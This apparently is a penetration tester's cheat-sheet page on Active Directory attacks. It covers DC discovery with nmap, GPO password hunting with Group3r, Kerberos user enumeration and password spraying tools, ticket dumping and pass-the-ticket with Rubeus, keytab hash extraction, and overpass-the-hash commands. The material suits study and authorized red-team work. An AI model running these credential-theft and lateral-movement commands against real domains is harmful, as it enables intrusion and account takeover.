+++
title = "Active Directory"
+++

- https://adsecurity.org/
# Sync Clock

```bash
# Linux
sudo timedatectl set-ntp false && sudo ntpdate <DC_IP> && date

# Windows
net.exe time /domain /set /y
```

# Auth Protocol Selection

| Method                                                    | Authentication Protocol | Encryption            | Limitations                                                                               |
| :-------------------------------------------------------- | :---------------------- | :-------------------- | :---------------------------------------------------------------------------------------- |
| **IP Address** (`192.168.1.10`) or un-registered hostname | **NTLM**                | RC4, NTLMv2           | No Kerberos support, may be blocked by policies, more logging/alerting                    |
| **Hostname/FQDN** (`DC01.domain.local`)                   | **Kerberos** (TGT/TGS)  | RC4, AES-128, AES-256 | Requires DNS resolution, subject to Kerberos delegation restrictions (Double Hop problem) |

# Domain Enumeration

| **Port** | Service            | **Role**                                                                |
| -------- | ------------------ | ----------------------------------------------------------------------- |
| **53**   | **DNS**            | Almost all DCs run DNS (AD Integrated DNS).                             |
| **88**   | **Kerberos**       | **BEST** Only KDCs (Domain Controllers) listen here.                    |
| **389**  | **LDAP**           | Directory Access. Essential for AD.                                     |
| **445**  | **SMB**            | Required for **SYSVOL** (Group Policy) replication.                     |
| **636**  | **LDAPS**          | Secure LDAP (Indicates a Certificate is installed).                     |
| **3268** | **Global Catalog** | **High Fidelity.** Indicates the server has a full index of the Forest. |
| **3269** | **GC SSL**         | Secure Global Catalog.                                                  |

```bash
sudo nmap -n -Pn -p 53,88,389,445,636,3268,3269 --open -oA nmap_find_dc.txt -v <TARGET>
```

{{< embed-section page="Docs/4 - Vuln Analysis/ldap" header="powershell-enumerator" >}}

{{< embed-section page="Docs/7 - Lateral Movement/Lateral Movement" header="network-info" >}}

{{< embed-section page="Docs/9 - Notes/bloodhound" header="bloodhound" >}}

{{< embed-section page="Docs/7 - Lateral Movement/active-directory-acl" >}}

### Group3r (Group Policy)

Deep-dive of GPOs. Unlike standard tools that check permissions, this parses the *content* of GPOs to find hardcoded passwords, local admin deployments, and script definitions

```cmd
# Basic Scan (Output to Console)
group3r.exe -s

# Full Scan (Output to File)
group3r.exe -f results.log
```

# User Enumeration

"A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication"
- https://github.com/ropnop/kerbrute
- Username Lists
    - https://github.com/initstring/linkedin2username
    - https://github.com/insidetrust/statistically-likely-usernames
- PowerShell Tool: https://github.com/dafthack/DomainPasswordSpray

{{< embed-section page="Docs/5 - Exploitation/online-credentials-attacks" header="user-enum" >}}

# Escalating and Pivoting

## Enumeration

### Windows

```bash
# Enumerate tickets currently in session
.\Rubeus.exe triage

# Export tickets to base64
.\Rubeus.exe dump /nowrap
```

### Linux

- https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd

**Keytab** holds a long-term Kerberos keys (non-expiring) while a **TGT** is the short-lived ticket to request TGS

```bash
# Enumerate AD information
realm list

# Check for AD
grep -i "sss\|winbind\|ldap" /etc/nsswitch.conf
ps -ef | grep -i "winbind\|sssd"
env | grep -i krb5

# Find keytabs
sudo find / \( -iname '*keytab*' -o -iname '*.kt' \) -ls 2>/dev/null

# List cached Kerberos tickets and keytabs
klist
ls -la /tmp/krb5cc*
```

### Double Hop Problem

- TL;DR: **Prefer RDP over WinRM/PowerShell Remoting**

The "Double Hop" problem arises when an attacker attempts to use Kerberos authentication across two (or more) hops. **Kerberos tickets should not be viewed as passwords** (e.g. only this computer can access that remote resource). On the contrary, a password is stored in the session and can be used elsewhere without issue

| Command              | Output Indicator                       | Meaning                                                            |
| :------------------- | :------------------------------------- | :----------------------------------------------------------------- |
| `klist`              | Missing `krbtgt/DOMAIN`                | You have no TGT. You cannot request tickets for other servers      |
| `klist`              | Present `HTTP/Hostname`                | You only have a service ticket for the current box                 |
| `dir \\<DC>\<SHARE>` | `Access is denied` / `Anonymous Logon` | The target sees you as "Anonymous" because no creds were forwarded |

- Mitigation Methods, if you have a...
    - NTLM Hash or AES Key, inject a TGT into current session
    - Plaintext password, use a PowerShell `PSCredential` object or `netexec`

## Pass the Ticket (PtT)

### Windows

```bash
# Pass from File
.\Rubeus.exe ptt /ticket:"<FILE_KIRBI_OR_BASE64>"
```

### Linux

- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
    - Check `$KRB5CCNAME`
        - Stored in `/tmp`
- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
    - Machine: `/etc/krb5.keytab`

```bash
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) KEYTAB.BAK
# Use current keytab
export KRB5CCNAME=KEYTAB.BAK
```

```bash
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) current.kt.bak
# Use current keytab
export KRB5CCNAME=$(pwd)/current.kt.bak

# Extract hashes from keytab files
# https://github.com/sosdave/KeyTabExtract
python3 keytabextract.py <KEYTAB_FILE>

# Use keytab
# NOTE: not all cached keytabs are valid
cp -v <KEYTAB> $HOME/current.kt.bak
export KRB5CCNAME=$HOME/current.kt.bak

# Use keytab
kinit -k '<NAME>'

# Validate ticket against target
nxc smb <TARGET> -k --use-kcache
```

## OverPass the Hash (OtH)/Pass the Key (PtK)

NTLM Hash/AES Key -> Kerberos TGT

{{< embed-section page="Docs/9 - Notes/mimikatz" header="extract-aes-keys" >}}

### Request & Inject

```bash
# Requests a TGT from the KDC and injects it into session
# Can use /rc4 (NTLM), /aes128, or /aes256
.\Rubeus.exe asktgt /ptt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY>
```
